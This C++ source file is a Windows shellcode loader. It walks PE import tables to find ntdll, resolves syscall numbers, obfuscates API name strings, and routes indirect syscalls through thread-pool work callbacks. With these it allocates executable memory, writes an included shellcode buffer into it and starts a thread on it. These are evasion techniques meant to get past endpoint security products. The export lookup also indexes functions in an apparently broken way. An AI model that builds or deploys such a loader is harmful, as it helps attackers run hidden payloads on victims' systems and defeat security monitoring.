#include "Callbacks.h"
#include "Shellcode.h"

#include <iostream>

//Definition of the Windows Thread Pooling functions
typedef NTSTATUS(NTAPI* TPALLOCWORK)(PTP_WORK* ptpWrk, PTP_WORK_CALLBACK pfnwkCallback, PVOID OptionalArg, PTP_CALLBACK_ENVIRON CallbackEnvironment);
typedef VOID(NTAPI* TPPOSTWORK)(PTP_WORK);
typedef VOID(NTAPI* TPRELEASEWORK)(PTP_WORK);

FARPROC pTpAllocWork;
FARPROC pTpPostWork;
FARPROC pTpReleaseWork;

/////////////////////////
//  GENERAL FUNCTIONS  //
/////////////////////////

HMODULE hNtdll;

extern "C" HMODULE FindMZ(DWORD64 baseAddress);

extern "C" DWORD GetSSN(DWORD64 functionAddress);

const char* GetModuleNameFromPE(uintptr_t baseAddress) {
    IMAGE_DOS_HEADER* dosHeader = reinterpret_cast<IMAGE_DOS_HEADER*>(baseAddress);
    IMAGE_NT_HEADERS* ntHeader = reinterpret_cast<IMAGE_NT_HEADERS*>(baseAddress + dosHeader->e_lfanew);
    
    IMAGE_EXPORT_DIRECTORY* exportDir = reinterpret_cast<IMAGE_EXPORT_DIRECTORY*>(
        baseAddress + ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    const char* moduleName = reinterpret_cast<const char*>(baseAddress + exportDir->Name);
    return moduleName;
}

HMODULE getNtdllHandle(HMODULE moduleHandle) {
    const char* moduleName = GetModuleNameFromPE(reinterpret_cast<uintptr_t>(moduleHandle));
    if (strcmp(moduleName, "ntdll.dll") == 0) {
        return moduleHandle;
    }

    uintptr_t baseAddress = reinterpret_cast<uintptr_t>(moduleHandle);

    uintptr_t dosHeaderAddr = baseAddress;
    IMAGE_DOS_HEADER* dosHeader = reinterpret_cast<IMAGE_DOS_HEADER*>(dosHeaderAddr);

    uintptr_t peHeaderAddr = baseAddress + dosHeader->e_lfanew;
    IMAGE_NT_HEADERS* ntHeader = reinterpret_cast<IMAGE_NT_HEADERS*>(peHeaderAddr);

    IMAGE_IMPORT_DESCRIPTOR* importDesc = reinterpret_cast<IMAGE_IMPORT_DESCRIPTOR*>(
        baseAddress + ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);

    while (importDesc->Name) {
        char* dllName = reinterpret_cast<char*>(baseAddress + importDesc->Name);

        if (strcmp(dllName, "ntdll.dll") == 0) {
            return moduleHandle;
        }

        uintptr_t dllBaseAddress = baseAddress + importDesc->FirstThunk;

        uintptr_t thunkTable = baseAddress + importDesc->OriginalFirstThunk;

        while (true) {
            IMAGE_THUNK_DATA* thunk = reinterpret_cast<IMAGE_THUNK_DATA*>(thunkTable);

            if (thunk->u1.AddressOfData == 0) {
                break;
            }

            if (!(thunk->u1.Ordinal & IMAGE_ORDINAL_FLAG)) {
                IMAGE_IMPORT_BY_NAME* importByName = reinterpret_cast<IMAGE_IMPORT_BY_NAME*>(baseAddress + thunk->u1.AddressOfData);
                //std::cout << "Function Name: " << importByName->Name << std::endl;

                uintptr_t functionAddress = *reinterpret_cast<uintptr_t*>(dllBaseAddress);
                //std::cout << "Function Address: 0x" << std::hex << functionAddress << std::endl;

                HMODULE functionDllHandle = FindMZ(functionAddress);
                //std::cout << "Function DLL Handle: 0x" << std::hex << functionDllHandle << std::endl;

                HMODULE result = getNtdllHandle(functionDllHandle);
                if (result != nullptr) {
                    return result;
                }
            }

            thunkTable += sizeof(IMAGE_THUNK_DATA);
            dllBaseAddress += sizeof(uintptr_t);
        }

        importDesc++;
    }

    return nullptr;
}

uintptr_t GetExportFunctionAddress(HMODULE moduleHandle, const char* functionName) {
    uintptr_t baseAddress = reinterpret_cast<uintptr_t>(moduleHandle);

    uintptr_t dosHeaderAddr = baseAddress;
    IMAGE_DOS_HEADER* dosHeader = reinterpret_cast<IMAGE_DOS_HEADER*>(dosHeaderAddr);

    uintptr_t peHeaderAddr = baseAddress + dosHeader->e_lfanew;
    IMAGE_NT_HEADERS* ntHeader = reinterpret_cast<IMAGE_NT_HEADERS*>(peHeaderAddr);

    IMAGE_EXPORT_DIRECTORY* exportDir = reinterpret_cast<IMAGE_EXPORT_DIRECTORY*>(
        baseAddress + ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    DWORD* addressOfFunctions = reinterpret_cast<DWORD*>(baseAddress + exportDir->AddressOfFunctions);
    DWORD numberOfFunctions = exportDir->NumberOfFunctions;

    DWORD* addressOfNameOrdinals = reinterpret_cast<DWORD*>(baseAddress + exportDir->AddressOfNameOrdinals);
    DWORD* addressOfNames = reinterpret_cast<DWORD*>(baseAddress + exportDir->AddressOfNames);

    uintptr_t functionAddress = 0;

    for (DWORD i = 0; i < numberOfFunctions; ++i) {
        const char* currentFunctionName = nullptr;

        if (i < exportDir->NumberOfNames) {
            currentFunctionName = reinterpret_cast<const char*>(baseAddress + addressOfNames[i]);
        }

        uintptr_t functionAddress = baseAddress + addressOfFunctions[i+1];

        if (currentFunctionName && strcmp(currentFunctionName, functionName) == 0) {
            functionAddress = functionAddress;
            return functionAddress;
        }
    }

    return -1;
}

DWORD findSyscallNumber(const char* functionName) {
    hNtdll = getNtdllHandle(FindMZ(0));

    if (hNtdll == 0) {
        return -1;
    }

    DWORD64 functionAddress = GetExportFunctionAddress(hNtdll, functionName);

    if (functionAddress == -1) {
        return -1;
    }

    DWORD ssn = GetSSN(functionAddress);

    return ssn;
}

VOID initVariables() {
    unsigned char sNtdll[] = { 'n', 't', 'd', 'l', 'l', '.', 'd', 'l', 'l', 0x0 };
    //hNtdll = GetModuleHandleA((LPCSTR)sNtdll);
    hNtdll = getNtdllHandle(FindMZ(0));

    Search_For_Syscall_Ret(hNtdll);
    Search_For_Add_Rsp_Ret(hNtdll);

    unsigned char sTpAllocWork[] = { 'T', 'p', 'A', 'l', 'l', 'o', 'c', 'W', 'o', 'r', 'k' , 0x0 };
    pTpAllocWork = GetProcAddress(hNtdll, (LPCSTR)sTpAllocWork);

    unsigned char sTpPostWork[] = { 'T', 'p', 'P', 'o', 's', 't', 'W', 'o', 'r', 'k' , 0x0 };
    pTpPostWork = GetProcAddress(hNtdll, (LPCSTR)sTpPostWork);

    unsigned char sTpReleaseWork[] = { 'T', 'p', 'R', 'e', 'l', 'e', 'a', 's', 'e', 'W', 'o', 'r', 'k', 0x0 };
    pTpReleaseWork = GetProcAddress(hNtdll, (LPCSTR)sTpReleaseWork);
}

VOID setCallback(PTP_WORK_CALLBACK callback, PVOID args) {
    PTP_WORK WorkReturn = NULL;
    ((TPALLOCWORK)pTpAllocWork)(&WorkReturn, (PTP_WORK_CALLBACK)callback, args, NULL);
    ((TPPOSTWORK)pTpPostWork)(WorkReturn);
    ((TPRELEASEWORK)pTpReleaseWork)(WorkReturn);
    WaitForSingleObject((HANDLE)-1, 0x1000);
}

/////////////////////////
//  NTDLL'S FUNCTIONS  //
/////////////////////////

PVOID NtAllocateVirtualMemory(HANDLE hProcess) {
    PVOID allocatedAddress = NULL;
    SIZE_T allocatedsize = 0x1000;

    NTALLOCATEVIRTUALMEMORY_ARGS ntAllocateVirtualMemoryArgs = { 0 };
    ntAllocateVirtualMemoryArgs.hProcess = (HANDLE)-1;
    ntAllocateVirtualMemoryArgs.address = &allocatedAddress;
    ntAllocateVirtualMemoryArgs.zeroBits = 0;
    ntAllocateVirtualMemoryArgs.size = &allocatedsize;
    ntAllocateVirtualMemoryArgs.allocationType = (MEM_RESERVE | MEM_COMMIT);
    ntAllocateVirtualMemoryArgs.permissions = PAGE_EXECUTE_READWRITE;
    ntAllocateVirtualMemoryArgs.ssn = findSyscallNumber("NtAllocateVirtualMemory");

    setCallback((PTP_WORK_CALLBACK)NtAllocateVirtualMemory_Callback, &ntAllocateVirtualMemoryArgs);

    return allocatedAddress;
}

VOID NtWriteVirtualMemory(HANDLE hProcess, PVOID allocatedAddress, PULONG bytesWritten) {
    NTWRITEVIRTUALMEMORY_ARGS ntWriteVirtualMemoryArgs = { 0 };
    ntWriteVirtualMemoryArgs.hProcess = hProcess;
    ntWriteVirtualMemoryArgs.address = allocatedAddress;
    ntWriteVirtualMemoryArgs.buffer = code;
    ntWriteVirtualMemoryArgs.numberOfBytesToWrite = sizeof(code);
    ntWriteVirtualMemoryArgs.numberOfBytesWritten = bytesWritten;
    ntWriteVirtualMemoryArgs.ssn = findSyscallNumber("NtWriteVirtualMemory");

    //std::cout << "Test 0x" << std::hex << ntWriteVirtualMemoryArgs.ssn << std::endl;

    setCallback((PTP_WORK_CALLBACK)NtWriteVirtualMemory_Callback, &ntWriteVirtualMemoryArgs);
}

VOID NtCreateThreadEx(HANDLE hProcess, HANDLE hThread, PVOID allocatedAddress) {
    NTCREATETHREADEX_ARGS ntCreateThreadExArgs = { 0 };
    ntCreateThreadExArgs.threadHandle = &hThread;
    ntCreateThreadExArgs.desiredAccess = GENERIC_EXECUTE;
    ntCreateThreadExArgs.objectAttributes = NULL;
    ntCreateThreadExArgs.processHandle = hProcess;
    ntCreateThreadExArgs.lpStartAddress = allocatedAddress;
    ntCreateThreadExArgs.lpParameter = NULL;
    ntCreateThreadExArgs.flags = FALSE;
    ntCreateThreadExArgs.stackZeroBits = 0;
    ntCreateThreadExArgs.sizeOfStackCommit = 0;
    ntCreateThreadExArgs.sizeOfStackReserve = 0;
    ntCreateThreadExArgs.lpBytesBuffer = NULL;
    ntCreateThreadExArgs.ssn = findSyscallNumber("NtCreateThreadEx");

    setCallback((PTP_WORK_CALLBACK)NtCreateThreadEx_Callback, &ntCreateThreadExArgs);
}

////////////
//  MAIN  //
////////////

int main() {
    initVariables();

    //HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, <PID>);
    HANDLE hProcess = (HANDLE)-1;

    std::cout << "[*] Executing NtAllocateVirtualMemory..." << std::endl;
    PVOID allocatedAddress = NtAllocateVirtualMemory(hProcess);
    std::cout << "\t[+] Allocated at: 0x" << allocatedAddress << std::endl;

    ULONG writenSize = 0;
    std::cout << "[*] Executing NtWriteVirtualMemory..." << std::endl;
    NtWriteVirtualMemory(hProcess, allocatedAddress, &writenSize);

    HANDLE hThread = NULL;
    std::cout << "[*] Executing NtCreateThreadEx..." << std::endl;
    NtCreateThreadEx(hProcess, hThread, allocatedAddress);

    //WaitForSingleObject(hThread, 0x1000);

    return 0;
}
